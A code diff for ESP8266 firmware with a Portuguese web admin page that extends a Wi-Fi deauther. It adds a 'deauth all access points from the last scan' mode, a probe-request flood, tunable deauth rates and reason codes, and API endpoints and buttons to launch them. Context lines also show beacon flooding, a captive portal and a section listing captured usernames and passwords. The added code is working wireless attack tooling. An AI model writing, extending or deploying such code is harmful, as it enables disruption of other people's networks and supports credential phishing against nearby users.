@@ -10,6 +10,7 @@
 
 #include "app_state.h"
 #include "deauther.h"
+#include "wifi_scan.h"
 
 namespace
 {
@@ -90,6 +91,11 @@ namespace
     deautherApMac = doc["deauther_ap_mac"] | deautherApMac;
     deautherClientMac = doc["deauther_client_mac"] | deautherClientMac;
     deautherChannel = doc["deauther_channel"] | deautherChannel;
+    deautherDeauthAll = doc["deauther_deauth_all"] | deautherDeauthAll;
+    deautherDeauthsPerTarget = doc["deauther_deauths_per_target"] | deautherDeauthsPerTarget;
+    deautherDeauthReason = doc["deauther_deauth_reason"] | deautherDeauthReason;
+    deautherBeaconInterval100ms = doc["deauther_beacon_interval_100ms"] | deautherBeaconInterval100ms;
+    deautherProbeFramesPerSsid = doc["deauther_probe_frames_per_ssid"] | deautherProbeFramesPerSsid;
   }
 
   bool saveWiFiConfig()
@@ -113,6 +119,11 @@ namespace
     doc["deauther_ap_mac"] = deautherApMac;
     doc["deauther_client_mac"] = deautherClientMac;
     doc["deauther_channel"] = deautherChannel;
+    doc["deauther_deauth_all"] = deautherDeauthAll;
+    doc["deauther_deauths_per_target"] = deautherDeauthsPerTarget;
+    doc["deauther_deauth_reason"] = deautherDeauthReason;
+    doc["deauther_beacon_interval_100ms"] = deautherBeaconInterval100ms;
+    doc["deauther_probe_frames_per_ssid"] = deautherProbeFramesPerSsid;
 
     File file = LittleFS.open(wifiConfigPath, "w");
     if (!file)
@@ -563,15 +574,72 @@ namespace
     return true;
   }
 
+  int countScanApsWithBssid()
+  {
+    int n = 0;
+    for (int i = 0; i < g_wifiScanNetworkCount; i++)
+    {
+      bool nz = false;
+      for (int j = 0; j < 6; j++)
+      {
+        if (g_wifiScanNetworks[i].bssid[j] != 0)
+        {
+          nz = true;
+          break;
+        }
+      }
+      if (nz)
+      {
+        n++;
+      }
+    }
+    return n;
+  }
+
   void handleApiDeauthStart()
   {
+    const String allRaw = server.arg("deauth_all");
+    const bool wantAll = (allRaw == "1" || allRaw.equalsIgnoreCase("true"));
+
+    if (wantAll)
+    {
+      const int n = countScanApsWithBssid();
+      if (n <= 0)
+      {
+        server.send(400, "application/json; charset=utf-8",
+                     "{\"error\":\"Nenhum AP com BSSID no ultimo scan. Escaneie no ecra 5 ou use GET /api/scan e repita.\"}");
+        return;
+      }
+      deautherDeauthAll = true;
+      saveWiFiConfig();
+      toggleDeauther();
+      if (!deautherRunning)
+      {
+        server.send(500, "application/json; charset=utf-8",
+                     "{\"error\":\"Falha ao iniciar deauth em todos os AP (verifique o scan).\"}");
+        return;
+      }
+      JsonDocument doc;
+      doc["success"] = true;
+      doc["message"] = "Deauth (todos os AP do ultimo scan) iniciado";
+      doc["ap_count"] = n;
+      doc["note"] = "SoftAP mantido (WIFI_AP_STA). Pare com /api/deauth/stop ou o botao no ecra.";
+      String payload;
+      serializeJson(doc, payload);
+      server.send(200, "application/json; charset=utf-8", payload);
+      return;
+    }
+
+    deautherDeauthAll = false;
+    saveWiFiConfig();
+
     String apMac = server.arg("ap_mac");
     String clientMac = server.arg("client_mac");
     int channel = parseIntBounded(server.arg("channel"), 1, 14, 1);
 
     if (apMac.length() == 0 || clientMac.length() == 0)
     {
-      server.send(400, "application/json; charset=utf-8", "{\"error\":\"AP MAC and Client MAC required\"}");
+      server.send(400, "application/json; charset=utf-8", "{\"error\":\"ap_mac e client_mac obrigatorios (ou deauth_all=1)\"}");
       return;
     }
 
@@ -584,8 +652,8 @@ namespace
 
     JsonDocument doc;
     doc["success"] = true;
-    doc["message"] = "Deauther iniciado";
-    doc["note"] = "O Wi-Fi do ESP8266 (AP) desliga durante o ataque. Para parar: botao FLASH no ecra Deauther ou Serial.";
+    doc["message"] = deautherRunning ? "Deauth no alvo iniciado" : "Deauth nao iniciado (MAC invalido?)";
+    doc["note"] = "SoftAP mantido durante injecao. Pare com /api/deauth/stop.";
     String payload;
     serializeJson(doc, payload);
     server.send(200, "application/json; charset=utf-8", payload);
@@ -627,9 +695,32 @@ namespace
     server.send(200, "application/json; charset=utf-8", payload);
   }
 
+  void handleApiProbeStart()
+  {
+    startProbeAttack();
+    JsonDocument doc;
+    doc["success"] = true;
+    doc["message"] = "Probe attack started";
+    String payload;
+    serializeJson(doc, payload);
+    server.send(200, "application/json; charset=utf-8", payload);
+  }
+
+  void handleApiProbeStop()
+  {
+    stopProbeAttack();
+    JsonDocument doc;
+    doc["success"] = true;
+    doc["message"] = "Probe attack stopped";
+    String payload;
+    serializeJson(doc, payload);
+    server.send(200, "application/json; charset=utf-8", payload);
+  }
+
   void handleApiScanJson()
   {
     int n = WiFi.scanNetworks(false, true);
+    wifiScanStoreDriverResults(n);
 
     JsonDocument doc;
     JsonArray arr = doc["networks"].to<JsonArray>();
@@ -1135,6 +1226,27 @@ namespace
     page += "    alert(j.message);";
     page += "  }catch(e){alert('Erro ao parar beacon flood');}";
     page += "}";
+    page += "async function startDeauthAll(){";
+    page += "  try{";
+    page += "    const r = await fetch('/api/deauth/start', {method:'POST', headers:{'Content-Type':'application/x-www-form-urlencoded'}, body:'deauth_all=1'});";
+    page += "    const j = await r.json();";
+    page += "    alert(j.error || j.message);";
+    page += "  }catch(e){alert('Erro ao iniciar deauth em todos');}";
+    page += "}";
+    page += "async function startProbe(){";
+    page += "  try{";
+    page += "    const r = await fetch('/api/probe/start', {method:'POST'});";
+    page += "    const j = await r.json();";
+    page += "    alert(j.message);";
+    page += "  }catch(e){alert('Erro ao iniciar probe');}";
+    page += "}";
+    page += "async function stopProbe(){";
+    page += "  try{";
+    page += "    const r = await fetch('/api/probe/stop', {method:'POST'});";
+    page += "    const j = await r.json();";
+    page += "    alert(j.message);";
+    page += "  }catch(e){alert('Erro ao parar probe');}";
+    page += "}";
     page += "</script>";
 
     page += "<style>body{font-family:Arial,sans-serif;background:#111;color:#eee;max-width:560px;margin:0 auto;padding:20px}";
@@ -1176,14 +1288,26 @@ namespace
     page += "<label><input name='screen5_enabled' type='checkbox'" + String(screen5Enabled ? " checked" : "") + "> Deauther Wi-Fi</label>";
     page += "<p class='muted'>A tela do olho sempre fica ativa.</p>";
     page += "<label><input name='captive_portal' type='checkbox'" + String(captivePortalEnabled ? " checked" : "") + "> Ativar captive portal</label>";
+    page += "<h3>Deauther v2 (persistido)</h3>";
+    page += "<p class='muted'>Alinhado ao esp8266_deauther: deauth-all usa o ultimo scan (ecra 5 ou Buscar no /admin).</p>";
+    page += "<label><input name='deauther_deauth_all' type='checkbox'" + String(deautherDeauthAll ? " checked" : "") + "> Modo deauth em todos os AP do scan (deauthAll)</label>";
+    page += "<label>Deauths por alvo / segundo (DEAUTHS_PER_TARGET, 1–250)</label>";
+    page += "<input name='deauther_deauths_per_target' type='number' min='1' max='250' value='" + String(deautherDeauthsPerTarget) + "'>";
+    page += "<label>Codigo de motivo 802.11 (1–45)</label>";
+    page += "<input name='deauther_deauth_reason' type='number' min='1' max='45' value='" + String(deautherDeauthReason) + "'>";
+    page += "<label><input name='deauther_beacon_100ms' type='checkbox'" + String(deautherBeaconInterval100ms ? " checked" : "") + "> Beacon interval 100 ms (desmarcado = 1 s)</label>";
+    page += "<label>Probe: frames por SSID / segundo (1–20)</label>";
+    page += "<input name='deauther_probe_frames' type='number' min='1' max='20' value='" + String(deautherProbeFramesPerSsid) + "'>";
+    page += "<input type='hidden' name='deauther_ap_mac' value='" + escapeHtml(deautherApMac) + "'>";
+    page += "<input type='hidden' name='deauther_client_mac' value='" + escapeHtml(deautherClientMac) + "'>";
+    page += "<input type='hidden' name='deauther_channel' value='" + String(deautherChannel) + "'>";
     page += "<button type='submit'>Salvar e conectar</button></form>";
     page += "</div>";
 
     // Configuração do Deauther
     page += "<div class='card'>";
     page += "<h3>Deauther Wi-Fi</h3>";
-    page += "<p class='muted'>Busque redes Wi-Fi proximas e selecione um alvo para ataque de deautenticação.</p>";
-    page += "<p class='muted'><strong>Importante:</strong> ao iniciar, o ponto de acesso deste dispositivo desliga (comportamento necessario). Perde a ligacao ao /admin ate parar — use o <strong>botao FLASH</strong> no ecra Deauther (5) ou monitor serie para parar.</p>";
+    page += "<p class='muted'>Busque redes e selecione um alvo, ou use Deauth em todos (ultimo scan). O firmware mantem <strong>SoftAP + STA</strong> durante a injecao (como no v2 com UI).</p>";
     page += "<p><strong>Status:</strong> " + String(deautherRunning ? "<span class='ok'>ATIVO</span>" : "<span class='bad'>PARADO</span>") + "</p>";
     if (deautherRunning)
     {
@@ -1195,9 +1319,11 @@ namespace
     page += "<div id='networksList' style='margin-top:12px;'></div>";
     page += "<div id='deautherControls' style='margin-top:12px;display:none;'>";
     page += "<p><strong>Alvo selecionado:</strong> <span id='selectedTarget'>-</span></p>";
-    page += "<button onclick='startDeauth()'>Iniciar Ataque</button>";
-    page += "<button onclick='stopDeauth()' style='background:#8b2d2d;margin-left:8px;'>Parar Ataque</button>";
+    page += "<button onclick='startDeauth()'>Iniciar Deauth (alvo)</button>";
+    page += "<button onclick='startDeauthAll()' class='secondary' style='margin-left:8px;'>Deauth todos (scan)</button>";
+    page += "<button onclick='stopDeauth()' style='background:#8b2d2d;margin-left:8px;'>Parar</button>";
     page += "</div>";
+    page += "<p class='muted' style='margin-top:8px;'>Deauth todos: exige scan antes (botao acima ou ecra 5). Ajustes v2 estao no formulario <strong>Salvar e conectar</strong>.</p>";
     page += "</div>";
 
     // Beacon Flood
@@ -1213,9 +1339,16 @@ namespace
     page += "<button onclick='stopBeacon()' style='background:#8b2d2d;margin-left:8px;'>Parar Beacon Flood</button>";
     page += "</div>";
 
-    // Seções restantes (mantidas)
-    page += "<div class='card'><h3>Laboratorio: rede e payload (camada de aplicacao)</h3>";
-    page += "<p class='muted'>Lista redes 802.11 (somente leitura). Envio UDP/HTTP...</p>";
+    page += "<div class='card'>";
+    page += "<h3>Probe flood (v2)</h3>";
+    page += "<p class='muted'>Probe requests com SSIDs do roster interno (paridade com Attack::sendProbe).</p>";
+    page += "<p><strong>Status:</strong> " + String(probeActive ? "<span class='ok'>ATIVO</span>" : "<span class='bad'>PARADO</span>") + "</p>";
+    if (probeActive)
+    {
+      page += "<p><strong>Pacotes (sessao):</strong> " + String(probePacketsSent) + "</p>";
+    }
+    page += "<button onclick='startProbe()'>Iniciar Probe</button>";
+    page += "<button onclick='stopProbe()' style='background:#8b2d2d;margin-left:8px;'>Parar Probe</button>";
     page += "</div>";
 
     page += "<div class='card'><h3>Usuarios e senhas capturados</h3>";
@@ -1277,12 +1410,20 @@ namespace
     doc["deauther_ap_mac"] = deautherApMac;
     doc["deauther_client_mac"] = deautherClientMac;
     doc["deauther_channel"] = deautherChannel;
+    doc["deauther_deauth_all"] = deautherDeauthAll;
+    doc["deauther_deauths_per_target"] = deautherDeauthsPerTarget;
+    doc["deauther_deauth_reason"] = deautherDeauthReason;
+    doc["deauther_beacon_interval_100ms"] = deautherBeaconInterval100ms;
+    doc["deauther_probe_frames_per_ssid"] = deautherProbeFramesPerSsid;
     doc["deauther_running"] = deautherRunning;
     doc["deauther_packets_sent"] = deautherPacketsSent;
     doc["deauther_tmp_packet_rate"] = deautherTmpPacketRate;
     doc["deauther_inject_fail"] = deautherInjectFail;
     doc["beacon_active"] = beaconActive;
     doc["beacon_packets_sent"] = beaconPacketsSent;
+    doc["probe_active"] = probeActive;
+    doc["probe_packets_sent"] = probePacketsSent;
+    doc["wifi_scan_ap_count"] = g_wifiScanNetworkCount;
 
     String payload;
     serializeJson(doc, payload);
@@ -1305,6 +1446,14 @@ namespace
     String newDeautherApMac = server.arg("deauther_ap_mac");
     String newDeautherClientMac = server.arg("deauther_client_mac");
     int newDeautherChannel = parseIntBounded(server.arg("deauther_channel"), 1, 14, deautherChannel);
+    bool newDeautherDeauthAll = server.hasArg("deauther_deauth_all");
+    int newDeautherDeauthsPerTarget =
+        parseIntBounded(server.arg("deauther_deauths_per_target"), 1, 250, deautherDeauthsPerTarget);
+    int newDeautherDeauthReason =
+        parseIntBounded(server.arg("deauther_deauth_reason"), 1, 45, deautherDeauthReason);
+    bool newDeautherBeacon100ms = server.hasArg("deauther_beacon_100ms");
+    int newDeautherProbeFrames =
+        parseIntBounded(server.arg("deauther_probe_frames"), 1, 20, deautherProbeFramesPerSsid);
     unsigned long weatherSec = parseULongBounded(server.arg("weather_sec"), 10, 3600, weatherUpdateIntervalMs / 1000);
     unsigned long screenSec = parseULongBounded(server.arg("screen_sec"), 2, 120, screenChangeIntervalMs / 1000);
     int newTz = parseIntBounded(server.arg("tz"), -12, 14, timezoneOffsetHours);
@@ -1350,6 +1499,11 @@ namespace
     deautherApMac = newDeautherApMac;
     deautherClientMac = newDeautherClientMac;
     deautherChannel = newDeautherChannel;
+    deautherDeauthAll = newDeautherDeauthAll;
+    deautherDeauthsPerTarget = newDeautherDeauthsPerTarget;
+    deautherDeauthReason = newDeautherDeauthReason;
+    deautherBeaconInterval100ms = newDeautherBeacon100ms;
+    deautherProbeFramesPerSsid = newDeautherProbeFrames;
     setCaptivePortalEnabled(newCaptivePortalEnabled);
 
     applyDisplayAndTimeSettings();
@@ -1394,6 +1548,8 @@ namespace
     server.on("/api/deauth/stop", HTTP_POST, handleApiDeauthStop);
     server.on("/api/beacon/start", HTTP_POST, handleApiBeaconStart);
     server.on("/api/beacon/stop", HTTP_POST, handleApiBeaconStop);
+    server.on("/api/probe/start", HTTP_POST, handleApiProbeStart);
+    server.on("/api/probe/stop", HTTP_POST, handleApiProbeStop);
     server.on("/save", HTTP_POST, handleSave);
     server.on("/credentials/delete", HTTP_POST, handleDeleteCapturedCredential);
     server.on("/credentials/clear", HTTP_POST, handleClearCapturedCredentials);
